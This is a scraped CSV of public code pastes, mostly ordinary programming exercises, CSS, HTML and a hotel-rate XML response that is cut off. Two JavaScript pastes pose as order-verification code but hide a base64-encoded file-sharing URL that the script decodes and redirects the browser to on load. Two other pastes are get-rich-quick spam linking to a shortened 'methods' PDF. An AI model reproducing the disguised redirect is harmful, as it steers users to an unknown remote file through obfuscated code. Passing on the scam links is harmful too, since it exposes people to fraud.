id,title,username,language,date,content
WEVvS7Uu,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 01:03:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VKqu7g7r,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 12:56:42 PM CDT,"#include <iostream>
using namespace std;


struct node {
    int info;
    node * next;
    node * prev;
};

struct DLCL {
    node * head, * tail;
    void init() {
        head = NULL;
        tail = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->next = tail;
            tail->prev = head;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
            tail->next = head;
            head->prev = tail;
        }
        
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->prev = tail;
            tail->next = head;
        }
        else {
            tail->next = new_node;
            new_node->prev = tail;
            
            tail = new_node;
            tail->next = head;
            head->prev = tail;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {

                head = head->next;
                delete head->prev;
                head->prev = tail;
                tail->next = head;
                
            }
        }
    }
    
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {
                tail = tail->prev;
                delete tail->next;
                tail->next = head;
                head->prev = tail;
            }
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp->info != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    
    void inserAfter(int x, node * after) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(after != NULL) {
            if(after == head) {
                insertFront(x);
            }
            else if(after == tail) {
                insertEnd(x);
            }
            else {
                
                new_node->next = after->next;
                new_node->prev = after;
                after->next = new_node;
                new_node->next->prev = new_node;
            }
        }
    }
    void print() {
        if(head != NULL) {
            node * tmp = head;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info<<""-->"";
            tmp = tmp->next;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info << endl;
            
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << ""<--"";
            tmp = tmp->prev;
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << endl;
        }
    }
    
};
int main() {
    DLCL dll;
    dll.init();
    
    dll.insertFront(1);
    dll.insertFront(2);
    dll.insertFront(3);
    
    dll.insertEnd(4);
    dll.insertEnd(5);
    dll.insertEnd(6);
    dll.print();
    
    
    node * tmp = dll.head->next;
    dll.inserAfter(7, tmp);
    
    dll.print();
    
    return 0;
}
"
QUaT5eRq,combat,drakon-firestone,C++,Wednesday 2nd of April 2025 12:53:25 PM CDT,"void start_combat()
{
	Entity enemy = Entity(""Kosmita"");
    bool combatRunning = true;
	int choice, playerDamage, enemyDamage;
    while (combatRunning)
	{
        cout << endl << ""Co chcesz zrobić?"" << endl;
        cout << ""------------------------------------------------"" << endl;
        cout << ""Twoje życie: "" << player.get_health() << "" | Życie przeciwnika: "" << enemy.get_health() << endl;
		cout << ""------------------------------------------------"" << endl;

        cout << ""[1] Atakuj!"" << endl;
        cout << ""[2] Uciekaj!"" << endl << endl;
        cout << ""Wpisz numer: "";
        cin >> choice;
        
        switch (choice)
        {
        case 1: // Gracz atakuje
        	playerDamage = rand() % player.get_damage() + 1;

            cout << player.get_name() << "" atakuje! Rani przeciwnika o "" << playerDamage << "" punkty!"" << endl;
            enemy.dealDamage(playerDamage);
                
            if(enemy.get_health() > 0)
            {
            	enemyDamage = rand() % enemy.get_damage()  + 1;
				cout << enemy.get_name() << "" kontratakuje! Rani bohatera o "" << enemyDamage << "" punkty!"" << endl;

                player.dealDamage(enemyDamage);
                if(player.get_health() <= 0)
                {
                	cout << player.get_name() << "" przegrywa! Koniec walki!"" << endl;
					combatRunning = false;
                }
            }
            else
            {
                cout << enemy.get_name() << "" przegrywa! Koniec walki!"" << endl;
                cout << player.get_name() << "" znajduje 10 metalu!"" << endl;

                player.add_metal(10);
                combatRunning = false;
            }
        	break;
                
        case 2: // Gracz ucieka
            cout << player.get_name() << "" ucieka tracąc kolejne 5% tlenu! Koniec walki!"" << endl;
            player.change_oxygen(-5);
            combatRunning = false;
            break;

        }
    }
}"
fi5LDFbn,Random Gmail Acc 1A,Thelapse,JavaScript,Wednesday 2nd of April 2025 12:52:45 PM CDT," 
Pdf https://tinyurl.com/methodssss


tl8wH8w7FM
"
09tPuJqe,Pillole video 7,fcamuso,C++,Wednesday 2nd of April 2025 12:48:22 PM CDT,"#include <iostream>
#include <chrono>
#include <vector>


using namespace std;

struct Nodo {
  string dato = """";

  Nodo *next = nullptr;
};



void ins_testa(Nodo *&il, Nodo *nuovo)
{
    nuovo->next = il;
    il = nuovo;
}



void ins_coda(Nodo *&il, Nodo *nuovo)
{
  if (il == nullptr) //lista vuota ?
  {
    nuovo->next = il;
    il = nuovo;
  }
  else
  {
    Nodo *ultimo = il;

    //otteniamo un puntatore all'ultimo nodo attuale
    while(ultimo->next != nullptr) ultimo = ultimo->next;

    ultimo->next = nuovo;
    nuovo->next = nullptr;
  }
}

void stampa_dalla_coda(Nodo *p, int profondita, int &massima)
{
  massima = max(profondita, massima);

  if (p!=nullptr)
    stampa_dalla_coda(p->next, profondita+1, massima);
}


//Equazione di ricorrenza temporale: T(n) = 2*T(n/2) + O(n)
//Equazione di ricorrenza spaziale: T(n) = T(n/2) + O(1)
//Complessità temporale: O(nlog(n))
//Complessità spaziale: O(log(n))
void stampaInvertita(Nodo *testa,int  dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return;
    //Lista con un solo elemento
    if (testa->next == nullptr)
        ;//cout << testa->dato << endl;
        //Passo ricorsivo
    else{
        Nodo* attuale = testa;
        //Suddivido in due metà la lista
        for (int i = 0; i < dim/2 - 1; ++i) {
            attuale = attuale->next;
        }
        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        stampaInvertita(attuale, dim/2);
        stampaInvertita(testa, dim - dim/2);

        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;
    }
}

//credits Alex-qk5ei (youtube)
int stampaInvertitaMisuraStack(Nodo *testa, int dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return 1;
    //Lista con un solo elemento
    if (testa->next == nullptr) {
        ;//cout << testa->dato << endl;
        return 1;
    }
    //Passo ricorsivo
    else{
        Nodo* attuale = testa;

        //Suddivido in due metà la lista
        for (int i = 0; i < (dim>>1) - 1; ++i) {
            attuale = attuale->next;
        }

        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        /*La profondità massima dello stack P(n) può essere definita ricorsivamente come: P(n) = max(P(n/2), P(n-n/2)) + 1
        L'addendo 1 equivale alla presenza sullo stack del record di attivazione corrente
        Inoltre, considerando che n-n/2 >= n/2 in ogni caso, max(P(n/2), P(n-n/2)) = P(n-n/2) e, conseguentemente
        P(n) = P(n-n/2) + 1
        L'istruzione sottostante rappresenta dunque la profondità massima che andrà restituita al metodo chiamante
        */
        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        int profondita = stampaInvertitaMisuraStack(attuale, dim - (dim>>1)) + 1;
        stampaInvertitaMisuraStack(testa, dim>>1);
        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;

        return profondita;
    }
}

int fattoriale(int n)
{
   if (n == 0)
    return 1;
   else
     return n * fattoriale(n - 1);
}


int fattoriale_tail(int n, int accumulatore=1)
{
   if (n == 0)
    return accumulatore;
   else
    return fattoriale_tail(n - 1, n * accumulatore);
}


enum Comando {START, STOP};
auto Cronometro(Comando comando = Comando::START)
{
  static std::chrono::time_point<std::chrono::system_clock> inizio;
  static std::chrono::time_point<std::chrono::system_clock> fine;

  if (comando == Comando::START)
  {
    inizio = chrono::high_resolution_clock::now();
    fine = inizio;
  }
  else
    fine = chrono::high_resolution_clock::now();


  return chrono::duration_cast<std::chrono::milliseconds>(fine - inizio).count();
}








void stampaInvertitaVector(Nodo *il)
{
  vector<Nodo*> v;

  while(il!=nullptr)
  {
    v.push_back(il);
    il = il-> next;
  }

  for (int i=v.size()-1; i>=0; i--);
    //cout << v[i] -> dato << "" "";
}








void InvertiLista(Nodo *&il)
{

  Nodo * precedente = nullptr;
  Nodo * corrente=il;
  Nodo * successivo = nullptr;

  while(corrente!=nullptr)
  {
    successivo = corrente->next;
    corrente->next =  precedente;

    precedente = corrente;
    corrente = successivo;
  }

  il=precedente;
}





void stampa(Nodo *p)
{
  while (p!=nullptr)
  {
    //cout << p->dato << "" "";

    //al prossimo nodo
    p = p->next;
  }
}

// Struttura per rappresentare una ""mossa""
struct HanoiMove {
    int n;          // Numero di dischi
    char from;      // Piolo di partenza (A, B, C)
    char to;        // Piolo di destinazione
    char aux;       // Piolo ausiliario
};

// Versione iterativa senza STL (stack manuale)
void hanoi_iterative_no_stl(int n, char from = 'A', char to = 'C', char aux = 'B') {
    const int MAX_STACK_SIZE = 1000; // Dimensione massima dello stack
    HanoiMove stack[MAX_STACK_SIZE];
    int top = -1; // Inizializza lo stack vuoto

    // Simula la prima chiamata ricorsiva
    stack[++top] = {n, from, to, aux};

    while (top >= 0) { // Finché lo stack non è vuoto
        HanoiMove current = stack[top--]; // Pop

        if (current.n == 1) {
            // Caso base: sposta il disco
            cout << ""Muovi disco 1 da "" << current.from << "" a "" << current.to << endl;
        } else {
            // Simula le chiamate ricorsive in ordine inverso (LIFO)
            // 1. hanoi(n-1, aux, to, from)
            stack[++top] = {current.n - 1, current.aux, current.to, current.from};
            // 2. Sposta il disco n da from a to (caso base fittizio)
            stack[++top] = {1, current.from, current.to, current.aux};
            // 3. hanoi(n-1, from, aux, to)
            stack[++top] = {current.n - 1, current.from, current.aux, current.to};
        }
    }
}


void hanoi(int n, char from = 'A', char to = 'C', char aux = 'B') {
    if (n == 1) {
        cout << ""Muovi disco 1 da "" << from << "" a "" << to << endl;
        return;
    }
    hanoi(n - 1, from, aux, to);  // Sposta n-1 dischi da 'from' a 'aux'
    cout << ""Muovi disco "" << n << "" da "" << from << "" a "" << to << endl;
    hanoi(n - 1, aux, to, from);  // Sposta n-1 dischi da 'aux' a 'to'
}

int main()
{
    //cout << fattoriale_tail(60001) << endl;
    //hanoi_iterative_no_stl(3);

    string dati_prova[] = {""abaco"", ""amo"", ""bicicletta"", ""cane"", ""canguro"", ""mare"", ""sale"", ""zebra""};

    Nodo *il = nullptr;

    int quante_run=10000;
    int num_ele = 20000;

    for (int i=0; i<num_ele; i++)
      ins_testa(il, new Nodo{dati_prova[i%8]});

    //stampaInvertitaVector(il);

//    stampa(il);
//    InvertiLista(il);
//    stampa(il);
//    InvertiLista(il);
//    stampa(il);



    //CON RICORSIONE E DIVIDE ET IMPERA
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertita(il,num_ele);
    cout << ""Ricorsione con divide/impera: "" << Cronometro(Comando::STOP) << endl;

    //CON VECTOR DI APPOGGIO
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertitaVector(il);
    cout << ""Iterativa con vector di puntatori: "" << Cronometro(Comando::STOP) << endl;


    //CON INVERSIONE PUNTATORI
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
    {
      InvertiLista(il);
      stampa(il);
      InvertiLista(il);
    }
    cout << ""Iterativa con inversione fisica lista: "" << Cronometro(Comando::STOP) << endl;



    return 0;
}
"
UaMgzu6w,Untitled,s-sols,CSS,Wednesday 2nd of April 2025 12:47:24 PM CDT,":is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 12px;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 7);
display: none;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-of-type(-n+4) {
display: block;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(-n+3) {
display: block;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(1) {
order: -1;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(2) {
order: -2;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(3) {
order: -3;
}

@media screen and (max-width: 1599px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 6);
}
}

@media screen and (max-width: 1399px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 5);
}
}

@media screen and (max-width: 1199px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 4);
}
}

@media screen and (max-width: 991px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 85px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
}
}

@media screen and (max-width: 799px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 60px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 3);
}
}"
Ez6QnRk5,Make $1000 15-MINUTES (BEGINNER) WM,Thelapse,JavaScript,Wednesday 2nd of April 2025 12:36:50 PM CDT," 
Pdf https://tinyurl.com/methodssss


OkcPRb1dum
"
dX6W82Tv,Basket Boy | กระทู้โรลเพลย์,Kelly-B9978,HTML,Wednesday 2nd of April 2025 12:35:30 PM CDT,"<!-- อาคารเรียน -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">School Building</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>

<!-- พื้นที่รอบนอก -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Outdoor Area</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>"
1XmdCcCe,Untitled,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:32:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/426/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waHhAZZv,latency model size compute,mayankjoin3,Python,Wednesday 2nd of April 2025 12:30:36 PM CDT,"import pandas as pd
import time
import psutil
import os
from sklearn.model_selection import StratifiedKFold
from sklearn.ensemble import ExtraTreesClassifier
from sklearn.metrics import classification_report
import joblib
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder
import numpy as np

# Step 1: Load the data
file_path = ""m5.csv""
df = pd.read_csv(file_path)

# Preprocessing: If categorical columns exist, encode them
label_encoder = LabelEncoder()

# Assuming 'category' column is the target and there may be categorical features
# Encode categorical features if needed, e.g., if there are string columns
# Here we will assume 'category' is the target and all other columns are features
X = df.drop(columns=['label'])
y = df['label']

# Encoding categorical features (if they exist)
X = X.apply(lambda col: label_encoder.fit_transform(col.astype(str)), axis=0, result_type='expand')

# Step 2: Initialize the ExtraTreesClassifier
clf = ExtraTreesClassifier(random_state=42, n_jobs=-1)  # n_jobs=-1 allows for parallel processing

# Step 3: Set up 2-Fold Cross-Validation
skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)

# Step 4: Evaluate Model Using Cross-Validation
fold = 1
for train_index, test_index in skf.split(X, y):
    print(f""Fold {fold}..."")
    X_train, X_test = X.iloc[train_index], X.iloc[test_index]
    y_train, y_test = y.iloc[train_index], y.iloc[test_index]

    # Step 5: Train the model
    start_time = time.time()
    clf.fit(X_train, y_train)
    training_time = time.time() - start_time
    print(f""Training time for fold {fold}: {training_time:.4f} seconds"")

    # Step 6: Test the model and measure latency
    start_time = time.time()
    predictions = clf.predict(X_test)
    prediction_time = time.time() - start_time
    print(f""Prediction time for fold {fold}: {prediction_time:.4f} seconds per instance"")

    # Step 7: Memory and CPU Usage during prediction
    process = psutil.Process(os.getpid())
    memory_before = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_before = psutil.cpu_percent(interval=1)

    # Perform prediction to measure CPU and Memory usage
    clf.predict(X_test)

    memory_after = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_after = psutil.cpu_percent(interval=1)

    memory_usage = memory_after - memory_before
    cpu_usage = cpu_after - cpu_before

    print(f""Memory usage during prediction: {memory_usage:.4f} MB"")
    print(f""CPU usage during prediction: {cpu_usage:.4f}%"")

    # Step 8: Output classification report
    # print(""Classification Report:"")
    # print(classification_report(y_test, predictions))

    # Step 9: Model size on disk
    model_filename = f'extratrees_model_fold{fold}.pkl'
    joblib.dump(clf, model_filename)
    model_size = os.path.getsize(model_filename) / (1024 * 1024)  # in MB
    print(f""Model size for fold {fold}: {model_size:.4f} MB"")

    fold += 1
"
bhVtV9Mn,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 12:28:16 PM CDT,"#include <iostream>
using namespace std;


struct node {
    int info;
    node * next;
    node * prev;
};

struct DLL {
    node * head;
    
    void init() {
        head = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
        }
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
        }
        else {
            node * tmp = head;
            while(tmp->next != NULL) {
                tmp = tmp->next;
            }
            
            tmp->next = new_node;
            new_node->prev = tmp;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                head = head->next;
                delete head->prev;
                head->prev = NULL;
            }
        }
    }
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == NULL) {
                delete head;
                head = NULL;
            }
            else {
                node * tmp = head;
                while(tmp->next != NULL) {
                    tmp = tmp->next;
                }
                tmp->prev->next = NULL;
                delete tmp;
                tmp = NULL;
            }
        }
    }
    
    void deleteAll() {
        while(head != NULL) {
            deleteEnd();
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp->info != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != NULL and tmp != x) {
                    tmp = tmp->next;
                }
                
                if(tmp->next == NULL) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                    
                }
            }
        }
    }
    void print() {
        node * tmp = head, * last;
        while(tmp != NULL) {
            last = tmp;
            cout << tmp->info << ""->"";
            tmp = tmp -> next;
        }
        cout << endl;
        
        while(last != NULL) {
            cout << last->info << ""<--"";
            last = last->prev;
        }
        cout << endl;
    }
};
int main() {
    DLL dll;
    dll.init();
    
    dll.insertFront(1);
    dll.insertFront(2);
    dll.insertFront(3);
    
    
    dll.insertEnd(4);
    dll.insertEnd(5);
    dll.insertEnd(6);
    dll.print();
    
    dll.deleteNode(4);
    dll.print();
    
    return 0;
}
"
zHtb9MjH,Untitled,BrycePate,XML,Wednesday 2nd of April 2025 12:20:59 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:wsa=""http://schemas.xmlsoap.org/ws/2004/08/addressing"" xmlns:wsse=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"" xmlns:wsu=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
   <soap:Header>
      <wsa:Action>hotelrateinquiryResponse</wsa:Action>
      <wsa:MessageID>urn:uuid:e6fe5b1d-720e-4073-89a7-6e8e3bb0067e</wsa:MessageID>
      <wsa:RelatesTo>urn:uuid:2f05b040-4fd6-4da5-9717-f858f7c73d8f</wsa:RelatesTo>
      <wsa:To>http://www.w3.org/2005/08/addressing/role/anonymous</wsa:To>
      <wsse:Security>
         <wsu:Timestamp wsu:Id=""Timestamp-4604d32f-83ee-427c-8cd3-2270571d7284"">
            <wsu:Created>2025-04-02T17:14:52Z</wsu:Created>
            <wsu:Expires>2025-04-02T17:19:52Z</wsu:Expires>
         </wsu:Timestamp>
      </wsse:Security>
   </soap:Header>
   <soap:Body>
      <hotelrateresults arrival=""2025-04-17"" depart=""2025-04-20"" group="""" corporate="""" secretary="""" agent="""">
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>N1SC</unittype>
            <unitnumber />
            <unitdescription>Shoshone 1 Bedroom</unitdescription>
            <unitpic />
            <firstnite>335.3000</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>963.0700</unitrate>
            <subtotal>801.0700</subtotal>
            <extras>162.0000</extras>
            <grats>80.1100</grats>
            <taxes>102.5400</taxes>
            <package>963.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>162.0000</batchedextras>
            <total amount=""1145.7200"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U9SM</unittype>
            <unitnumber />
            <unitdescription>Summit QM Studio</unitdescription>
            <unitpic />
            <firstnite>409.0100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>948.0700</unitrate>
            <subtotal>948.0700</subtotal>
            <extras>0.0000</extras>
            <grats>94.8100</grats>
            <taxes>121.3500</taxes>
            <package>948.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1164.2300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U0SQ</unittype>
            <unitnumber />
            <unitdescription>Summit 2Q</unitdescription>
            <unitpic />
            <firstnite>531.8100</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1273.0700</unitrate>
            <subtotal>1273.0700</subtotal>
            <extras>0.0000</extras>
            <grats>127.3100</grats>
            <taxes>162.9500</taxes>
            <package>1273.0700</package>
            <unbatchedextras>0.0000</unbatchedextras>
            <batchedextras>0.0000</batchedextras>
            <total amount=""1563.3300"" includesGrats=""true"" includesTaxes=""true"" />
            <crescode>000000</crescode>
            <cresname />
            <cresurl />
            <cresemail />
            <crespic />
         </rateresult>
         <rateresult arrival=""2025-04-17"" depart=""2025-04-20"" ratecode=""IRACK"">
            <ratedescription>Base Internet Rates</ratedescription>
            <ratenote>Breakfast included when staying at the Huntley, Shoshone, Village Center &amp; Whitewater Inn.
&lt;br&gt;
&lt;br&gt;
Nightly room rate is subject to 10% Resort Services Fee. To learn more, visit bigskyresort.com/service-fee.</ratenote>
            <rateyieldgroupcode>Z</rateyieldgroupcode>
            <unittype>U0DA</unittype>
            <unitnumber />
            <unitdescription>Summit Mobility K</unitdescription>
            <unitpic />
            <firstnite>568.6500</firstnite>
            <arate>0.0000</arate>
            <crate>0.0000</crate>
            <orate>0.0000</orate>
            <unitrate>1253.0700</unitrate>
            <subtotal>1253.0700</subtotal>
